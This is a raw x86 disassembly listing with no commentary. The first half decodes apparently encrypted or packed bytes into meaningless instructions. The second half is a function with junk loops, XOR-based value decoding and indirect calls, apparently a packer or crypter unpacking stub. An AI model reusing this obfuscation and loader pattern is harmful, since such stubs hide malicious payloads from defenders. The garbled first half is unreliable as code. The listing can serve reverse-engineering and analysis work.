  4069f2:	sbb    edx,esi
  4069f4:	rol    ecx,0x69
  4069f7:	lea    esp,[edx+edi*1+0x35eefcc8]
  4069fe:	fst    st(4)
  406a00:	lahf   
  406a01:	mov    cl,0x8c
  406a03:	pop    edx
  406a04:	iret   
  406a05:	scas   eax,DWORD PTR es:[edi]
  406a06:	and    ch,BYTE PTR [eax]
  406a08:	mov    cl,0x55
  406a0a:	or     eax,0x66665845
  406a0f:	add    al,bl
  406a11:	pop    edi
  406a12:	mov    ah,0xf1
  406a14:	loope  0x4069f9
  406a16:	add    bl,dh
  406a18:	cmc    
  406a19:	jmp    0x4069c0
  406a1b:	test   al,0xcc
  406a1d:	mov    dl,0xca
  406a1f:	push   edi
  406a20:	ret    0x49e6
  406a23:	fs cld 
  406a25:	xchg   ebp,eax
  406a26:	sbb    eax,0xde717911
  406a2b:	adc    ebx,DWORD PTR [eax+edx*2+0x5576dca6]
  406a32:	lods   al,BYTE PTR ds:[esi]
  406a33:	das    
  406a34:	shr    BYTE PTR [ecx+0x6b8dd342],cl
  406a3a:	pop    ecx
  406a3b:	push   esi
  406a3c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406a3d:	sbb    DWORD PTR [ecx+0x7e3eb21e],eax
  406a43:	xor    ecx,DWORD PTR gs:[ebp+eiz*1-0x72]
  406a48:	iret   
  406a49:	mov    ah,0xd6
  406a4b:	mov    ebx,0xc53fc912
  406a50:	inc    esp
  406a51:	neg    dl
  406a53:	pop    es
  406a54:	cmp    eax,0x6543e128
  406a59:	dec    edx
  406a5a:	mov    ebx,0x3e009ee8
  406a5f:	sets   BYTE PTR [esp+edx*8]
  406a63:	dec    esp
  406a64:	push   edi
  406a65:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406a66:	mov    dh,0x3b
  406a68:	dec    eax
  406a69:	mov    dh,0x23
  406a6b:	call   FWORD PTR [edx+0x1a]
  406a6e:	pop    edi
  406a6f:	lods   eax,DWORD PTR ds:[esi]
  406a70:	and    BYTE PTR [eax],al
  406a72:	sub    eax,0x9783ef56
  406a77:	lock push ds
  406a79:	sbb    esi,DWORD PTR [ebp+0x7082994e]
  406a7f:	not    DWORD PTR [edi-0x278634df]
  406a85:	add    dh,BYTE PTR [si]
  406a88:	inc    ebp
  406a89:	mov    al,ds:0xdf5e2722
  406a8e:	test   DWORD PTR [edi+0x797e8f97],esp
  406a94:	or     BYTE PTR [edi-0x72],bl
  406a97:	and    eax,0xd5e0e568
  406a9c:	jge    0x406ad8
  406a9e:	xchg   edi,eax
  406a9f:	in     eax,0xd9
  406aa1:	mov    ah,0x3c
  406aa3:	inc    edi
  406aa4:	inc    eax
  406aa5:	int    0xf2
  406aa7:	iret   
  406aa8:	jmp    0xdd59:0xb0973e7f
  406aaf:	outs   dx,DWORD PTR ds:[esi]
  406ab0:	fs (bad) 
  406ab2:	rol    DWORD PTR ds:0x2d5b6366,1
  406ab8:	jmp    0xe7f023c6
  406abd:	mov    ebx,DWORD PTR [ebx-0x3d6ef053]
  406ac3:	xor    ebx,DWORD PTR ds:0x5fb47ce
  406ac9:	and    BYTE PTR ds:0xc656d3c7,0xe7
  406ad0:	sub    al,0x11
  406ad2:	sti    
  406ad3:	stos   BYTE PTR es:[edi],al
  406ad4:	das    
  406ad5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406ad6:	arpl   WORD PTR [esp+esi*8],bp
  406ad9:	xor    BYTE PTR ds:0x2ef1580a,cl
  406adf:	hlt    
  406ae0:	mov    cl,0xa5
  406ae2:	adc    BYTE PTR [esp+ebp*8-0xe],al
  406ae6:	bound  esi,QWORD PTR [ebx-0x6b]
  406ae9:	sti    
  406aea:	xchg   DWORD PTR [edi],eax
  406aec:	sahf   
  406aed:	cmc    
  406aee:	(bad)  
  406aef:	xor    eax,0x6528e108
  406af4:	push   ds
  406af5:	pop    esp
  406af6:	cmp    DWORD PTR [eiz*4+0x7f09c408],0x830f04a2
  406b01:	xchg   ebp,eax
  406b02:	bound  eax,QWORD PTR fs:[esi]
  406b05:	sub    DWORD PTR [edi],ebx
  406b07:	aaa    
  406b08:	mov    cl,0x6d
  406b0a:	add    eax,0xc856b3e9
  406b0f:	jnp    0x406aae
  406b11:	sbb    DWORD PTR [eax],esp
  406b13:	add    DWORD PTR [ecx],ebx
  406b15:	fst    DWORD PTR [eax+ecx*1+0xf6eafe5]
  406b1c:	xor    BYTE PTR [ebx],al
  406b1e:	enter  0x73c2,0x68
  406b22:	mov    WORD PTR [edi+0x15b7dcdc],?
  406b28:	clc    
  406b29:	ja     0x406ba1
  406b2b:	test   BYTE PTR [ecx],bh
  406b2d:	adc    BYTE PTR [esi+0x323bb9be],bl
  406b33:	out    0x75,al
  406b35:	xchg   edx,eax
  406b36:	cmc    
  406b37:	jg     0x406b71
  406b39:	fmul   QWORD PTR [eax+0x1c]
  406b3c:	sub    eax,0x7f0534fa
  406b41:	stos   DWORD PTR es:[edi],eax
  406b42:	mov    edx,0x92c01b3d
  406b47:	add    al,0xc
  406b49:	dec    esp
  406b4a:	sbb    al,0x68
  406b4c:	int3   
  406b4d:	mov    ebp,ebx
  406b4f:	push   esi
  406b50:	push   ebp
  406b51:	fnstcw WORD PTR [edi-0x14edaa39]
  406b57:	dec    esp
  406b58:	shl    BYTE PTR [esi+0x392b5858],0xc4
  406b5f:	dec    edi
  406b60:	sub    ecx,DWORD PTR [ecx-0x5c]
  406b63:	addr16 clc 
  406b65:	inc    ecx
  406b66:	push   eax
  406b67:	hlt    
  406b68:	sbb    eax,0x51e4ab54
  406b6d:	and    ch,BYTE PTR [ebp-0x53]
  406b70:	sti    
  406b71:	push   eax
  406b72:	push   edi
  406b73:	mov    edi,DWORD PTR [esi-0x59]
  406b76:	ror    BYTE PTR ds:0x9c09f46f,0x78
  406b7d:	jecxz  0x406bfd
  406b7f:	(bad)  
  406b81:	addr16 mov al,ds:0x7f37
  406b85:	xchg   edi,eax
  406b86:	mov    ds:0x38949ec,al
  406b8b:	inc    edx
  406b8c:	mov    edi,0x26d4ff9b
  406b91:	adc    BYTE PTR [edi],bl
  406b93:	rcl    DWORD PTR [esi+eiz*1+0xbc07237],1
  406b9a:	sbb    esi,esi
  406b9c:	out    dx,eax
  406b9d:	popf   
  406b9e:	into   
  406b9f:	mov    edx,0x96345ebf
  406ba4:	xchg   ecx,eax
  406ba5:	leave  
  406ba6:	repnz ss mov cl,0xca
  406baa:	sub    eax,0x6bb6fc0d
  406baf:	ins    BYTE PTR es:[edi],dx
  406bb0:	out    0x3a,eax
  406bb2:	and    DWORD PTR [edi+esi*4],0xffffffbe
  406bb6:	xchg   DWORD PTR [ebx+0x79],ebp
  406bb9:	xchg   bl,bl
  406bbb:	rcr    BYTE PTR [edi],0xff
  406bbe:	cs mov ah,0x7b
  406bc1:	add    al,al
  406bc3:	adc    BYTE PTR [esi+0x3d],dh
  406bc6:	sti    
  406bc7:	push   edi
  406bc8:	(bad)  
  406bc9:	sbb    al,0x89
  406bcb:	(bad)  
  406bcd:	sub    esp,ecx
  406bcf:	mov    bh,0x73
  406bd1:	retf   
  406bd2:	sub    eax,esi
  406bd4:	push   ss
  406bd5:	jl     0x406be9
  406bd7:	and    BYTE PTR [eax-0x791af7ea],bh
  406bdd:	mov    ebp,0xbdcfecf
  406be2:	push   ss
  406be3:	sub    al,0x4b
  406be5:	mov    DWORD PTR [edi+0x1ae25121],0x379fcdbf
  406bef:	inc    ebp
  406bf0:	mov    WORD PTR [edx-0x65427fc6],?
  406bf6:	mov    ds:0xd41d8734,eax
  406bfb:	fidiv  DWORD PTR [ebp+0x41]
  406bfe:	icebp  
  406bff:	push   0xdc91ff0d
  406c04:	adc    eax,0x7e2fa54a
  406c09:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406c0a:	inc    eax
  406c0b:	inc    ebx
  406c0c:	xor    esp,DWORD PTR [edi-0x22]
  406c0f:	xchg   edi,eax
  406c10:	sbb    ah,BYTE PTR [edx+edx*1]
  406c13:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406c14:	icebp  
  406c15:	addr16 inc edi
  406c17:	arpl   bx,dx
  406c19:	mov    cl,0x3a
  406c1b:	mov    edi,0x74336947
  406c20:	(bad)  
  406c21:	mov    ebp,0xf0614b76
  406c26:	sub    dl,BYTE PTR gs:[ebx+0x41]
  406c2a:	data16 fild QWORD PTR [edx+edi*4]
  406c2e:	push   edi
  406c2f:	mov    eax,0xd397cb66
  406c34:	js     0x406c4d
  406c36:	mov    ebx,0xfe18f3b7
  406c3b:	call   0x376b:0x2f52953c
  406c42:	pop    es
  406c43:	dec    esp
  406c44:	mov    edx,0x440b2df9
  406c49:	adc    ecx,DWORD PTR [edi]
  406c4b:	test   BYTE PTR [edx+eax*1+0x35ff0000],bl
  406c52:	mov    dh,0x3c
  406c54:	inc    ecx
  406c55:	add    bh,bh
  406c57:	xor    eax,0x413a62
  406c5c:	mov    eax,DWORD PTR [edx+0x194]
  406c62:	push   DWORD PTR [eax]
  406c64:	mov    eax,DWORD PTR [ebp+0x10]
  406c67:	call   eax
  406c69:	jmp    0x406eef
  406c6e:	jmp    0x406eec
  406c73:	push   ebx
  406c74:	jo     0x406c41
  406c76:	es jmp 0xfbb1e021
  406c7c:	mov    edi,0xc6812bde
  406c81:	shld   edi,eax,cl
  406c84:	ret    0x7e7e
  406c87:	fistp  QWORD PTR [esi+edi*2+0x7e]
  406c8b:	daa    
  406c8c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406c8d:	sbb    DWORD PTR [edx+0x6dd1e319],edi
  406c93:	jbe    0x406c21
  406c95:	stc    
  406c96:	jl     0x406c9e
  406c98:	inc    ebp
  406c99:	jecxz  0x406c43
  406c9b:	sar    BYTE PTR es:[edx],cl
  406c9e:	xor    al,0x11
  406ca0:	sbb    DWORD PTR [ebp-0x6c],0x2c
  406ca4:	das    
  406ca5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406ca6:	sub    BYTE PTR [eax-0x7f],ah
  406ca9:	xchg   esi,eax
  406caa:	push   edi
  406cab:	fwait
  406cac:	add    ecx,DWORD PTR [eiz*1+0x72e73384]
  406cb3:	jp     0x406cbe
  406cb5:	lock push esi
  406cb7:	retf   
  406cb8:	sbb    ah,ch
  406cba:	add    BYTE PTR [edx+0x62357f63],bh
  406cc0:	jmp    0x406d21
  406cc2:	das    
  406cc3:	bound  esp,QWORD PTR [eax+0x76d47f32]
  406cc9:	int3   
  406cca:	lods   eax,DWORD PTR ds:[esi]
  406ccb:	retf   
  406ccc:	pop    edx
  406ccd:	leave  
  406cce:	and    DWORD PTR [esi],edi
  406cd0:	adc    eax,0x1375a921
  406cd5:	dec    esi
  406cd6:	mov    ah,0x37
  406cd8:	daa    
  406cd9:	out    dx,al
  406cda:	cmp    esi,esi
  406cdc:	adc    DWORD PTR ds:0x6bb20603,esi
  406ce2:	punpckhwd mm0,QWORD PTR [ebx+ebx*8]
  406ce6:	xchg   ecx,eax
  406ce7:	fidivr DWORD PTR [ecx+edi*2]
  406cea:	mov    ch,ah
  406cec:	leave  
  406ced:	jl     0x406ce6
  406cef:	stos   BYTE PTR es:[edi],al
  406cf0:	or     eax,0xcc5e289e
  406cf5:	pusha  
  406cf6:	cmp    DWORD PTR [ebp+0xa],ebx
  406cf9:	push   0xfffffffc
  406cfb:	mov    bh,BYTE PTR [ebx]
  406cfd:	jge    0x406cc6
  406cff:	mov    WORD PTR [eax+0x7bad0ed5],?
  406d05:	stos   BYTE PTR es:[edi],al
  406d06:	mov    DWORD PTR [esp+ebx*2-0x27],ebp
  406d0a:	adc    bh,BYTE PTR [edi]
  406d0c:	or     eax,0xe02a6d77
  406d11:	gs sahf 
  406d13:	jl     0x406d12
  406d15:	mov    esi,0xac6d6b47
  406d1a:	aad    0x5b
  406d1c:	(bad)  
  406d1d:	in     eax,0x2a
  406d1f:	rol    BYTE PTR [esi],cl
  406d21:	das    
  406d22:	mov    ebp,0xab4e6ff
  406d27:	mul    dh
  406d29:	push   0xa9829153
  406d2e:	gs inc ebp
  406d30:	int    0xd
  406d32:	dec    ebp
  406d33:	mov    fs,edx
  406d35:	sbb    bl,bl
  406d37:	aaa    
  406d38:	mov    ds:0xe9b1055e,al
  406d3d:	fld    TBYTE PTR [esi]
  406d3f:	push   es
  406d40:	sub    bh,BYTE PTR [edi]
  406d42:	test   BYTE PTR [ebx+0x12],ah
  406d45:	cmp    eax,0x7ce8b123
  406d4a:	sbb    BYTE PTR [ebx+edx*8+0x356b9255],bh
  406d51:	in     al,dx
  406d52:	push   0xc803c85a
  406d57:	mov    ebx,0xa4112c4e
  406d5c:	push   ds
  406d5d:	xor    esp,DWORD PTR [edx]
  406d5f:	(bad)  
  406d60:	pop    edi
  406d61:	ja     0x406d72
  406d63:	lock mov edx,0x55997b54
  406d69:	ins    BYTE PTR es:[edi],dx
  406d6a:	mov    dl,bh
  406d6c:	(bad)  
  406d6d:	dec    ecx
  406d6e:	fwait
  406d6f:	inc    edi
  406d70:	in     al,0x3
  406d72:	inc    edi
  406d73:	jg     0x406d1d
  406d75:	cmp    DWORD PTR [edx*4+0x4d4248a8],edx
  406d7c:	rcr    DWORD PTR [edx-0xc174f2],cl
  406d82:	test   eax,0xf2eea84f
  406d87:	(bad)  
  406d88:	ret    0xe288
  406d8b:	adc    eax,0x88a5caf7
  406d90:	ja     0x406d78
  406d92:	(bad)  
  406d93:	jae    0x406d90
  406d95:	ss aad 0x8e
  406d98:	cmc    
  406d99:	loope  0x406db4
  406d9b:	imul   ebx,DWORD PTR [ecx],0xd1a83dd
  406da1:	call   0x8ef0a4b4
  406da6:	pop    ds
  406da7:	cmp    eax,0xaa59acf1
  406dac:	fistp  DWORD PTR [edi-0x3e267a79]
  406db2:	in     eax,0xd2
  406db4:	popf   
  406db5:	sub    dl,BYTE PTR [edx]
  406db7:	mov    ds:0xa7505c44,eax
  406dbc:	mov    esp,0x5820350
  406dc1:	mov    al,ds:0xcadd4ecf
  406dc6:	adc    BYTE PTR [ebp+edx*2-0x8600040],cl
  406dcd:	push   ds
  406dce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406dcf:	add    BYTE PTR [eax+0x7542dd27],0xec
  406dd6:	mov    ds:0xe05ee01f,al
  406ddb:	adc    BYTE PTR [eax-0x665297e8],bh
  406de1:	aas    
  406de2:	add    edi,DWORD PTR [ecx]
  406de4:	cmp    al,dh
  406de6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406de7:	mov    ah,0x79
  406de9:	sub    DWORD PTR [esi+0x2c],esp
  406dec:	push   esp
  406ded:	dec    ebx
  406dee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406def:	push   ds
  406df0:	mov    ds:0xe7a548e0,al
  406df5:	jecxz  0x406da6
  406df7:	mov    bl,0xf8
  406df9:	adc    eax,0xb63078fe
  406dfe:	sahf   
  406dff:	aas    
  406e00:	cli    
  406e01:	xor    DWORD PTR [edx],ebx
  406e03:	bound  eax,QWORD PTR [ebp-0x72]
  406e06:	stos   BYTE PTR es:[edi],al
  406e07:	and    cl,BYTE PTR [ecx]
  406e09:	add    esp,DWORD PTR [edx+0x79]
  406e0c:	scas   al,BYTE PTR es:[edi]
  406e0d:	xchg   edx,eax
  406e0e:	push   eax
  406e0f:	ficomp WORD PTR [ecx+0x30]
  406e12:	xor    bh,BYTE PTR [edi]
  406e14:	push   ds
  406e15:	jno    0x406dec
  406e17:	mov    ecx,DWORD PTR [edi+0x13bd6405]
  406e1d:	inc    ebp
  406e1e:	xlat   BYTE PTR ds:[ebx]
  406e1f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406e20:	retf   
  406e21:	pop    ds
  406e22:	dec    eax
  406e23:	adc    DWORD PTR [ecx],eax
  406e25:	ss jnp 0x406e1f
  406e28:	nop
  406e29:	add    DWORD PTR [eax-0x4d8e0fda],ecx
  406e2f:	jecxz  0x406e39
  406e31:	mov    esp,0x4f13eef9
  406e36:	(bad)  
  406e37:	or     bl,dh
  406e39:	mov    ah,BYTE PTR [edi]
  406e3b:	and    DWORD PTR [ebx-0x77327197],0xffffffd2
  406e42:	push   esi
  406e43:	into   
  406e44:	push   edx
  406e45:	retf   0xb416
  406e48:	and    cl,BYTE PTR [edx+0xb48fed3]
  406e4e:	pop    eax
  406e4f:	jmp    0xaebd:0x468699d1
  406e56:	jns    0x406dfb
  406e58:	mov    esi,esp
  406e5a:	repz (bad)
  406e5d:	sar    cl,1
  406e5f:	xchg   bl,dl
  406e61:	int3   
  406e62:	(bad)  
  406e63:	push   esp
  406e64:	inc    ebp
  406e65:	xor    al,dl
  406e67:	inc    ebx
  406e68:	or     eax,0xa0b68a20
  406e6d:	xchg   ebx,eax
  406e6e:	(bad)  
  406e6f:	fsubr  DWORD PTR [edx+0x2c]
  406e72:	jb     0x406e11
  406e74:	jle    0x406e02
  406e76:	test   BYTE PTR [eax-0x11d287c1],bl
  406e7c:	mov    bh,0x8
  406e7e:	mov    fs,WORD PTR [ebx]
  406e80:	repz sub eax,0x17712b9d
  406e86:	test   al,0x11
  406e88:	mov    ds:0xb4a347e2,eax
  406e8d:	scas   eax,DWORD PTR es:[edi]
  406e8e:	jmp    0x4661:0xb39652fc
  406e95:	jle    0x406e6b
  406e97:	cmp    esp,DWORD PTR [esi+0x6a]
  406e9a:	imul   esp,DWORD PTR [esi-0x5d045a66],0xffffffed
  406ea1:	adc    eax,0xd9b169ab
  406ea6:	xor    BYTE PTR [edx],cl
  406ea8:	dec    ecx
  406ea9:	push   cs
  406eaa:	adc    edi,DWORD PTR [eax]
  406eac:	sub    cl,ah
  406eae:	adc    bh,BYTE PTR [edx-0x758055b1]
  406eb4:	push   eax
  406eb5:	mov    dl,0x19
  406eb7:	frstor [edi+eiz*8-0x43]
  406ebb:	cli    
  406ebc:	jns    0x406e69
  406ebe:	(bad)  
  406ebf:	jmp    0x646258c0
  406ec4:	jg     0x406e89
  406ec6:	jo     0x406f02
  406ec8:	pop    edx
  406ec9:	repz addr16 or al,ch
  406ecd:	(bad)  
  406ece:	jg     0x406ef9
  406ed0:	dec    esi
  406ed1:	xlat   BYTE PTR ds:[ebx]
  406ed2:	lahf   
  406ed3:	sahf   
  406ed4:	(bad)  
  406ed5:	push   cs
  406ed6:	sub    BYTE PTR ds:0x813338bb,0x8
  406edd:	mov    esp,0xd443dfdb
  406ee2:	xchg   ecx,eax
  406ee3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406ee4:	cdq    
  406ee5:	lods   eax,DWORD PTR ds:[esi]
  406ee6:	les    ebp,FWORD PTR [ecx+ecx*1+0x6f]
  406eea:	mov    ds:0x10458b4d,eax
  406eef:	leave  
  406ef0:	ret    0xc
  406ef3:	push   ebp
  406ef4:	mov    ebp,esp
  406ef6:	sub    esp,0x28
  406ef9:	mov    DWORD PTR ds:0x43376f,0x71e2
  406f03:	push   0x413d5e
  406f08:	call   DWORD PTR ds:0x412420
  406f0e:	cmp    BYTE PTR [eax],0x0
  406f11:	mov    DWORD PTR ds:0x433723,0xa08
  406f1b:	je     0x406f32
  406f21:	and    DWORD PTR ds:0x43382f,0x433713
  406f2b:	xor    eax,eax
  406f2d:	jmp    0x407466
  406f32:	push   0x413da6
  406f37:	add    DWORD PTR ds:0x43382f,0x4337a7
  406f41:	call   DWORD PTR ds:0x4121d4
  406f47:	mov    DWORD PTR ds:0x4337eb,0x6fd9
  406f51:	cmp    eax,0xa
  406f54:	mov    DWORD PTR ds:0x4337bb,0x485d
  406f5e:	jl     0x406f21
  406f64:	add    ecx,DWORD PTR ds:0x433827
  406f6a:	mov    DWORD PTR [ebp-0x8],0xf89c8531
  406f71:	mov    DWORD PTR ds:0x4337fb,0x11
  406f7b:	cmp    DWORD PTR ds:0x4337fb,0x0
  406f82:	je     0x406fdd
  406f88:	cmp    DWORD PTR ds:0x4337fb,0x5
  406f8f:	jne    0x406fa5
  406f95:	push   0x7487
  406f9a:	push   0x433867
  406f9f:	call   DWORD PTR ds:0x4121c0
  406fa5:	cmp    DWORD PTR ds:0x4337fb,0x6
  406fac:	jne    0x406fbf
  406fb2:	mov    ecx,DWORD PTR ds:0x4337fb
  406fb8:	dec    ecx
  406fb9:	mov    DWORD PTR ds:0x4337fb,ecx
  406fbf:	xor    ecx,ecx
  406fc1:	add    ecx,DWORD PTR ds:0x4337fb
  406fc7:	dec    ecx
  406fc8:	mov    DWORD PTR ds:0x4337fb,ecx
  406fce:	jmp    0x406f7b
  406fd3:	adc    DWORD PTR ds:0x43372b,0x7658
  406fdd:	mov    DWORD PTR [ebp-0x4],0xf89c8532
  406fe4:	mov    DWORD PTR ds:0x433773,0x15
  406fee:	cmp    DWORD PTR ds:0x433773,0x0
  406ff5:	je     0x407051
  406ffb:	cmp    DWORD PTR ds:0x433773,0x2
  407002:	jne    0x40701d
  407008:	push   0x43377b
  40700d:	push   0x433803
  407012:	push   0x3143
  407017:	call   DWORD PTR ds:0x412360
  40701d:	cmp    DWORD PTR ds:0x433773,0x3
  407024:	jne    0x407039
  40702a:	xor    ecx,ecx
  40702c:	or     ecx,DWORD PTR ds:0x433773
  407032:	dec    ecx
  407033:	mov    DWORD PTR ds:0x433773,ecx
  407039:	mov    ecx,DWORD PTR ds:0x433773
  40703f:	dec    ecx
  407040:	mov    DWORD PTR ds:0x433773,ecx
  407046:	jmp    0x406fee
  40704b:	sbb    ecx,DWORD PTR ds:0x4337ff
  407051:	lea    eax,[ebp-0x20]
  407054:	mov    DWORD PTR ds:0x43372f,0x1c
  40705e:	cmp    DWORD PTR ds:0x43372f,0x0
  407065:	je     0x4070a1
  40706b:	cmp    DWORD PTR ds:0x43372f,0x2b
  407072:	jne    0x407089
  407078:	push   DWORD PTR [ebp-0xc]
  40707b:	push   0x43372f
  407080:	push   DWORD PTR [ebp-0x24]
  407083:	call   DWORD PTR ds:0x4121c4
  407089:	mov    ecx,DWORD PTR ds:0x43372f
  40708f:	dec    ecx
  407090:	mov    DWORD PTR ds:0x43372f,ecx
  407096:	jmp    0x40705e
  40709b:	xor    ecx,0x624a
  4070a1:	mov    DWORD PTR [ebp-0x14],eax
  4070a4:	lea    eax,[ebp-0x1c]
  4070a7:	mov    DWORD PTR [ebp-0x10],eax
  4070aa:	adc    ecx,eax
  4070ac:	mov    eax,ds:0x413bde
  4070b1:	mov    ecx,DWORD PTR ds:0x433747
  4070b7:	mov    ecx,DWORD PTR [ecx]
  4070b9:	xor    DWORD PTR ds:0x4337b3,ecx
  4070bf:	mov    eax,DWORD PTR [eax+0x1c8]
  4070c5:	or     DWORD PTR ds:0x433733,0x1d95
  4070cf:	mov    eax,DWORD PTR [eax]
  4070d1:	sub    ecx,0x7a4e
  4070d7:	mov    ecx,DWORD PTR [ebp-0x10]
  4070da:	add    DWORD PTR ds:0x43376f,0x433727
  4070e4:	push   ebx
  4070e5:	push   esi
  4070e6:	sub    DWORD PTR ds:0x43371f,ebx
  4070ec:	mov    esi,0x7510854
  4070f1:	and    DWORD PTR ds:0x4337a7,0x0
  4070fb:	mov    ebx,DWORD PTR ds:0x4337a7
  407101:	inc    ebx
  407102:	mov    DWORD PTR ds:0x4337a7,ebx
  407108:	cmp    DWORD PTR ds:0x4337a7,0x7
  40710f:	jne    0x407128
  407115:	push   DWORD PTR [ebp-0x1c]
  407118:	push   0x8eb0
  40711d:	push   0x3be9
  407122:	call   DWORD PTR ds:0x4121c8
  407128:	cmp    DWORD PTR ds:0x4337a7,0x6
  40712f:	jne    0x407144
  407135:	xor    ebx,ebx
  407137:	xor    ebx,DWORD PTR ds:0x4337a7
  40713d:	inc    ebx
  40713e:	mov    DWORD PTR ds:0x4337a7,ebx
  407144:	cmp    DWORD PTR ds:0x4337a7,0x15
  40714b:	jb     0x4070fb
  407151:	and    DWORD PTR ds:0x4337eb,edi
  407157:	xor    eax,esi
  407159:	sub    ebx,DWORD PTR ds:0x43371b
  40715f:	push   edi
  407160:	xor    ebx,0x561f
  407166:	mov    edi,0x32729b
  40716b:	mov    DWORD PTR ds:0x433843,0x1c
  407175:	cmp    DWORD PTR ds:0x433843,0x0
  40717c:	je     0x407271
  407182:	cmp    DWORD PTR ds:0x433843,0x25
  407189:	jne    0x40719d
  40718f:	push   0x43389a
  407194:	push   DWORD PTR [ebp-0x20]
  407197:	call   DWORD PTR ds:0x412008
  40719d:	mov    ebx,DWORD PTR ds:0x433843
  4071a3:	dec    ebx
  4071a4:	mov    DWORD PTR ds:0x433843,ebx
  4071aa:	jmp    0x407175
  4071af:	and    DWORD PTR ds:0x43371f,0x0
  4071b9:	jmp    0x4071cb
  4071be:	mov    ebx,DWORD PTR ds:0x43371f
  4071c4:	inc    ebx
  4071c5:	mov    DWORD PTR ds:0x43371f,ebx
  4071cb:	cmp    DWORD PTR ds:0x43371f,0x1a
  4071d2:	jae    0x407271
  4071d8:	cmp    DWORD PTR ds:0x43371f,0x8
  4071df:	jne    0x4071f0
  4071e5:	push   0x2cbb
  4071ea:	call   DWORD PTR ds:0x41200c
  4071f0:	cmp    DWORD PTR ds:0x43371f,0x7
  4071f7:	jne    0x40720a
  4071fd:	mov    ebx,DWORD PTR ds:0x43371f
  407203:	inc    ebx
  407204:	mov    DWORD PTR ds:0x43371f,ebx
  40720a:	jmp    0x4071be
  40720f:	and    DWORD PTR ds:0x433783,0x0
  407219:	mov    ebx,DWORD PTR ds:0x433783
  40721f:	inc    ebx
  407220:	mov    DWORD PTR ds:0x433783,ebx
  407226:	cmp    DWORD PTR ds:0x433783,0x4
  40722d:	jne    0x407244
  407233:	push   DWORD PTR [ebp-0x10]
  407236:	push   0x347b
  40723b:	push   DWORD PTR [ebp-0xc]
  40723e:	call   DWORD PTR ds:0x412364
  407244:	cmp    DWORD PTR ds:0x433783,0x3
  40724b:	jne    0x40725e
  407251:	mov    ebx,DWORD PTR ds:0x433783
  407257:	inc    ebx
  407258:	mov    DWORD PTR ds:0x433783,ebx
  40725e:	cmp    DWORD PTR ds:0x433783,0x11
  407265:	jb     0x407219
  40726b:	adc    DWORD PTR ds:0x43372f,ebx
  407271:	add    eax,edi
  407273:	mov    DWORD PTR ds:0x43371f,0x2325
  40727d:	mov    DWORD PTR [ecx],eax
  40727f:	mov    DWORD PTR ds:0x4337f7,0x6c11
  407289:	mov    eax,ds:0x413e96
  40728e:	mov    ebx,0x7633
  407293:	cmp    eax,0x23c13046
  407298:	mov    eax,DWORD PTR [ebp-0x4]
  40729b:	mov    ebx,0xf89c853d
  4072a0:	je     0x4072b8
  4072a6:	mov    ecx,DWORD PTR [ebp-0x8]
  4072a9:	xor    eax,esi
  4072ab:	add    eax,edi
  4072ad:	imul   eax,ecx
  4072b0:	mov    DWORD PTR [ebp-0x8],eax
  4072b3:	jmp    0x4072ef
  4072b8:	xor    eax,esi
  4072ba:	add    eax,edi
  4072bc:	mov    ds:0x413cf2,eax
  4072c1:	mov    eax,DWORD PTR [ebp-0x8]
  4072c4:	xor    eax,esi
  4072c6:	add    eax,edi
  4072c8:	mov    ds:0x413e96,eax
  4072cd:	mov    eax,DWORD PTR [ebp-0x4]
  4072d0:	mov    ecx,DWORD PTR ds:0x413cf2
  4072d6:	xor    eax,esi
  4072d8:	add    eax,edi
  4072da:	cmp    ecx,eax
  4072dc:	jne    0x4072ef
  4072e2:	push   ebx
  4072e3:	push   DWORD PTR [ebp-0x4]
  4072e6:	push   DWORD PTR [ebp-0x8]
  4072e9:	call   DWORD PTR ds:0x413cea
  4072ef:	mov    eax,ds:0x413bde
  4072f4:	mov    eax,DWORD PTR [eax+0x18c]
  4072fa:	mov    eax,DWORD PTR [eax]
  4072fc:	mov    DWORD PTR [ebp-0x18],eax
  4072ff:	mov    DWORD PTR [ebp-0x10],ebx
  407302:	mov    DWORD PTR [ebp-0x10],ebx
  407305:	mov    DWORD PTR [ebp-0x10],ebx
  407308:	mov    DWORD PTR [ebp-0x10],0xf89c8531
  40730f:	mov    DWORD PTR [ebp-0x28],ebx
  407312:	mov    DWORD PTR [ebp-0x28],0xf89c8539
  407319:	mov    ebx,DWORD PTR [ebp-0x8]
  40731c:	xor    ebx,esi
  40731e:	add    ebx,edi
  407320:	jmp    0x40735b
  407325:	mov    eax,DWORD PTR [ebp-0x4]
  407328:	xor    eax,esi
  40732a:	lea    eax,[eax+ebx*1+0x32729b]
  407331:	push   eax
  407332:	mov    eax,DWORD PTR [ebp-0x10]
  407335:	xor    eax,esi
  407337:	lea    eax,[ebp+eax*1+0x3272a3]
  40733e:	push   eax
  40733f:	mov    eax,ds:0x413bde
  407344:	push   DWORD PTR [eax+0x1bc]
  40734a:	call   0x410353
  40734f:	mov    eax,DWORD PTR [ebp-0x4]
  407352:	xor    eax,esi
  407354:	lea    ebx,[ebx+eax*1+0x32729b]
  40735b:	mov    eax,DWORD PTR [ebp-0x4]
  40735e:	mov    ecx,DWORD PTR [ebp-0x4]
  407361:	xor    ecx,esi
  407363:	xor    eax,esi
  407365:	add    eax,ecx
  407367:	mov    ecx,DWORD PTR [ebp-0x4]
  40736a:	xor    ecx,esi
  40736c:	lea    eax,[eax+ecx*1+0x9757d1]
  407373:	cmp    ebx,eax
  407375:	jbe    0x407325
  40737b:	mov    eax,DWORD PTR [ebp+0xc]
  40737e:	mov    ds:0x413a62,eax
  407383:	mov    eax,DWORD PTR [ebp+0x10]
  407386:	mov    ds:0x413cb6,eax
  40738b:	mov    eax,ds:0x413a62
  407390:	mov    ecx,DWORD PTR [ebp-0x14]
  407393:	push   DWORD PTR [ebp-0x18]
  407396:	sub    eax,edi
  407398:	push   DWORD PTR [ebp-0x1c]
  40739b:	xor    eax,esi
